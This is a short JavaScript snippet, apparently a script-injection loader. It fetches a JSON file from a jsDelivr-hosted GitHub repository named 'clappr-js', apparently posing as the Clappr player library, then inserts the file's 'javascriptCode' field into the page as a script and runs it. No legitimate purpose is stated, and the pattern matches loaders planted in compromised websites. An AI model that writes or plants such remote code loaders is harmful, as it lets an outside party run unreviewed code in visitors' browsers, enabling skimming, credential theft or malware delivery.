
    // Fetch the JSON file
    fetch('https://cdn.jsdelivr.net/gh/clappr-js/clappr@main/ge555o.json')
        .then(response => response.json())
        .then(jsonData => {
            // Inject the JavaScript code into the page
            const scriptElement = document.createElement('script');
            scriptElement.textContent = jsonData.javascriptCode;
            document.body.appendChild(scriptElement);
        })
        .catch(error => {
            console.error('Error fetching JSON file:', error);
        });
